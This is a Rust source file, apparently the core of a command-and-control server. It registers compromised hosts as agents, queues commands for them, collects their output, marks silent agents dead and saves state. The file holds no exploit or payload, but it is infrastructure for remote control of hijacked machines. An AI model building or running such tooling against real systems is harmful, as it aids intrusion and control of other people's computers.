use std::{fs::OpenOptions, io::Write, path::{Path, PathBuf}};
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::Mutex;
use std::collections::HashMap;
use ratatui::text::{Line, Span};
use ratatui::style::{Style, Color};


use crate::{core::agent::{Agent, AgentState}, tasking::agent_command::AgentCommand};
use crate::utils::logging::Logging;
use crate::tasking::tasking::{Task, TaskManager};

use super::agent::AgentResult;


#[derive(Debug)]
pub struct C2 {
    agents: Arc<Mutex<HashMap<u64, Agent>>>,
    log: PathBuf,
    next_id: u64,
    task_manager: TaskManager
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SaveData {
    agents: HashMap<u64, Agent>,
    next_id: u64
}

impl C2 {
    /// Creates a C2 instance with log file path and option to load saved C2 state
    pub fn create(log_file: impl AsRef<Path>, load_file: Option<&Path>) -> Result<Self, std::io::Error> {
        let log_path = log_file.as_ref();
        let mut file = OpenOptions::new()
                .create(true)
                .write(true)
                .open(log_path)?;

        match load_file {
            Some(path) => {
                // Check if p is valid path
                if path.exists() {
                    // Deserialize
                    let json = std::fs::read_to_string(path)?;

                    let parsed = serde_json::from_str::<SaveData>(&json)?;

                    file.write_all(b"C2 Loaded from Save State\n")?;

                    Ok(C2 {
                        agents: Arc::new(Mutex::new(parsed.agents)),
                        log: log_path.to_path_buf(),
                        next_id: parsed.next_id,
                        task_manager: TaskManager::new()
                    })
                } else {
                    file.write_all(b"C2 Log File Initialization - Save file not found\n")?;
                    Ok(C2 {
                        agents: Arc::new(Mutex::new(HashMap::new())),
                        log: log_path.to_path_buf(),
                        next_id: 1,
                        task_manager: TaskManager::new()
                    })
                }
            },
            _ => {
                file.write_all(b"C2 Log File Initialization\n")?;
                Ok(C2 {
                    agents: Arc::new(Mutex::new(HashMap::new())),
                    log: log_path.to_path_buf(),
                    next_id: 1,
                    task_manager: TaskManager::new()
                    })

                }
        }
        
    }

    /// Creates an agent after connection received
    pub async fn create_agent(&mut self, ip: &str, hostname: &str, os: &str, time: &str, session_id: &str) -> u64{
        let agent_id = self.next_id;
        self.next_id += 1;

        let agent: Agent = Agent { 
            id: agent_id, 
            status: AgentState::Alive,
            ip: ip.to_string(),
            last_seen: Utc::now(),
            time_compromised: time.parse().unwrap(),
            hostname: hostname.to_string(),
            os: os.to_string(),
            session_id: session_id.to_string(),
            results: Vec::new()
        };

        let mut agents = self.agents.lock().await;
        agents.insert(agent_id, agent);
        let msg = format!("New agent {} created from {}", agent_id, ip);
        //Logging::SUCCESS.print_message(&msg);
        Logging::SUCCESS.log(&self.log, &msg);

        agent_id
    }

    /// Prints out agents to terminal
    pub async fn _list_agents(&self) {
        let agents = self.agents.lock().await;
        for agent in agents.values() {
            agent.show();
        }
    }

    pub async fn list_agents_pretty(&self) {
        let agents = self.agents.lock().await;

        Logging::RESULT.print_message(&format!(
            "{:<6} {:<18} {:<10} {:<24} {:<30}",
            "ID", "IP", "Status", "Last Seen", "Session ID"
        ));
        Logging::RESULT.print_message(&"-".repeat(95));
        
        for (id, agent) in agents.iter() {
            Logging::RESULT.print_message(&format!(
                "{:<6} {:<18} {:<10} {:<24} {:<30}",
                id,
                agent.ip,
                agent.status,
                format!("  {}", agent.last_seen.format("%Y-%m-%d %H:%M:%S")),
                agent.session_id
            ));
        }

    }

    pub async fn print_agents(&self) -> Vec<Line<'static>> {
        let agents = self.agents.lock().await;

        let mut lines = Vec::new();

        // Define result color (blue)
        let result_color = Color::Blue;
        let style = Style::default().fg(result_color);

        // Header
        lines.push(Line::styled(
            format!(
                "{:<6} {:<18} {:<10} {:<24} {:<30}",
                "ID", "IP", "Status", "Last Seen", "Session ID"
            ),
            style,
        ));

        // Divider
        lines.push(Line::styled("-".repeat(95), style));

        // Agent entries
        for (id, agent) in agents.iter() {
            lines.push(Line::styled(
                format!(
                    "{:<6} {:<18} {:<10} {:<24} {:<30}",
                    id,
                    agent.ip,
                    agent.status,
                    format!("  {}", agent.last_seen.format("%Y-%m-%d %H:%M:%S")),
                    agent.session_id
                ),
                style,
            ));
        }

        lines
    }

    /// Prints out agent with id to terminal
    pub async fn list_agent(&self, id: u64) {
        let agents = self.agents.lock().await;
        if let Some(agent) = agents.get(&id) {
            agent.show();
        }
    }

    /// Update agent status
    pub async fn _update_agent_status(&self, id: u64, new_status: AgentState) -> bool {
        let mut agents = self.agents.lock().await;
        if let Some(agent) = agents.get_mut(&id) {
            agent.update_status(new_status);
            true
        } else {
            false
        }
    }

    /// Update agent status
    pub async fn update_agent_time(&self, id: u64) -> bool {
        let mut agents = self.agents.lock().await;
        if let Some(agent) = agents.get_mut(&id) {
            agent.update_time();
            true
        } else {
            false
        }
    }

    /// Update agent session
    pub async fn update_agent_session(&self, id: u64, session_id: &str) -> bool {
        let mut agents = self.agents.lock().await;
        if let Some(agent) = agents.get_mut(&id) {
            agent.session_id = session_id.to_string();
            true
        } else {
            false
        }
    }
    
    /// Check if valid session exists -> may need to add more checks to ensure secure
    pub async fn check_session(&self, id: &str) -> bool {
        let agents = self.agents.lock().await;
        for agent in agents.values() {
            if agent.session_id == id {
                return true
            }
        }
        return false
        
    }

    /// Check if agent exists in agents with given agent_id
    pub async fn agent_exists(&self, id: u64) -> bool {
        let agents = self.agents.lock().await;
        if let Some(_agent) = agents.get(&id) {
            true
        } else {
            false
        }

    }

    /// Removes agent by id
    pub async fn remove_agent(&mut self, id: u64) {
        let mut agents = self.agents.lock().await;
        agents.remove(&id);
    }

    /// Periodically sweeps for dead agents based on last check in time
    pub async fn sweep_dead_agents(&mut self, timeout: u64) {
        let now = Utc::now();
        let mut agents = self.agents.lock().await;
    
        for agent in agents.values_mut() {
            Logging::DEBUG.print_message(&format!(
                "Agent {} has status {:?}",
                agent.id, agent.status
            ));
    
            if agent.status == AgentState::Alive {
                let duration_since_seen = now.signed_duration_since(agent.last_seen);
    
                if duration_since_seen.num_seconds() > timeout as i64 {
                    agent.update_status(AgentState::Dead);
                    Logging::ERROR.print_message(&format!(
                        "Agent {} failed to check in ({} seconds ago)",
                        agent.id,
                        duration_since_seen.num_seconds()
                    ));
                }
            }
        }
    }

    /// Checks TaskManager if there are any tasks for agent_id and returns it
    pub async fn get_tasks(&self, id: u64) -> Option<Vec<AgentCommand>> {
        self.task_manager.get_tasks(id).await
    }

    pub async fn create_task(&self, id: u64, task: Task) {
        self.task_manager.add_task(id, task).await;
    }

    pub async fn create_result(&self, id: u64, result: AgentResult) {
        let mut agents = self.agents.lock().await;
        if let Some(agent) = agents.get_mut(&id) {
            agent.results.push(result);
        }
    }

    pub async fn update_result(&self, id: u64, results: Vec<String>) {
        let mut agents = self.agents.lock().await;
        if let Some(agent) = agents.get_mut(&id) {
            let mut result_iter = results.into_iter();

            for agent_result in &mut agent.results {
                let AgentResult::CommandOutput { 
                    command: _, output, read, timestamp: _ } = agent_result;
                // Only update if output is still pending
                if output.is_none() {
                    if let Some(new_output) = result_iter.next() {
                        *output = Some(new_output);
                        *read = false; // Mark as unread
                    } else {
                        break;
                    }
                }
            }
        }

    }

    /// Display results to terminal for selected agent with option to show all or just unread
    pub async fn display_results(&self, id: u64, show_all: bool) {
        let mut agents = self.agents.lock().await;
    
        if let Some(agent) = agents.get_mut(&id) {
            let mut any_shown = false;
    
            for (i, res) in agent.results.iter_mut().enumerate() {
                let AgentResult::CommandOutput { 
                    command, output, read, timestamp } = res;
                    if show_all || !*read {
                        Logging::RESULT.print_message(&format!("--- Result [{}] ---", i + 1));
                        Logging::RESULT.print_message(&format!("Command: {}", command));
                
                        match output {
                            Some(data) => Logging::RESULT.print_message(&format!("Output:\n{}", data.trim_end())),
                            None => Logging::RESULT.print_message(&format!("Output: [Pending]")),
                        }
                
                        Logging::RESULT.print_message(&format!("Timestamp: {:?}", timestamp));
                        *read = true;
                        any_shown = true;
                    }
            }
    
            if !any_shown {
                Logging::RESULT.print_message(&format!("No {}results to display.", if show_all { "" } else { "new " }));
            }
        } else {
            Logging::RESULT.print_message(&format!("Agent ID {} not found.", id));
        }
    }


    pub async fn display_results_lines(&self, id: u64, show_all: bool) -> Vec<Line<'static>> {
        let mut lines = Vec::new();
        let mut agents = self.agents.lock().await;

        let result_style = Style::default().fg(Color::Blue); // matches Logging::RESULT

        if let Some(agent) = agents.get_mut(&id) {
            let mut any_shown = false;

            for (i, res) in agent.results.iter_mut().enumerate() {
                if let AgentResult::CommandOutput { command, output, read, timestamp } = res {
                    if show_all || !*read {
                        lines.push(Line::styled(format!("--- Result [{}] ---", i + 1), result_style));
                        lines.push(Line::styled(format!("Command: {}", command), result_style));

                        match output {
                            Some(data) => {
                                // Split output across multiple lines if necessary
                                for line in data.trim_end().lines() {
                                    lines.push(Line::styled(format!("Output: {}", line), result_style));
                                }
                            },
                            None => {
                                lines.push(Line::styled("Output: [Pending]".to_string(), result_style));
                            }
                        }

                        lines.push(Line::styled(format!("Timestamp: {:?}", timestamp), result_style));
                        lines.push(Line::raw("")); // blank line between results

                        *read = true;
                        any_shown = true;
                    }
                }
            }

            if !any_shown {
                lines.push(Line::styled(
                    format!("No {}results to display.", if show_all { "" } else { "new " }),
                    result_style,
                ));
            }
        } else {
            lines.push(Line::styled(format!("Agent ID {} not found.", id), result_style));
        }

        lines
    }


    /// Clear results from a selected agent
    pub async fn clear_results(&self, id: u64) {
        let mut agents = self.agents.lock().await;
        if let Some(agent) = agents.get_mut(&id) {
            agent.clear_results();
        }
    }

    /// Saves C2 state to JSON file
    pub async fn _save(&self) -> Result<(),std::io::Error>{
        let agents = self.agents.lock().await;
        let data = SaveData {
            agents: agents.clone(),
            next_id: self.next_id
        };

        let json = serde_json::to_string_pretty(&data)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;

        // Use atomic write pattern
        let temp_path = "c2_state.tmp";
        tokio::fs::write(temp_path, json).await?;
        tokio::fs::rename(temp_path, "c2_state.json").await?;

        Ok(())
    }
    
    /// Loads Agent state from JSON file
    pub fn _load(file_path: impl AsRef<Path>) -> Result<Self, std::io::Error> {
        let path = file_path.as_ref();  
        let json = std::fs::read_to_string(path)?;

        let parsed = serde_json::from_str::<SaveData>(&json)?;

        Ok (C2 {
            agents: Arc::new(Mutex::new(parsed.agents)),
            log: PathBuf::from("c2_test_log_file.txt"),
            next_id: parsed.next_id,
            task_manager: TaskManager::new()
        })
    }
}

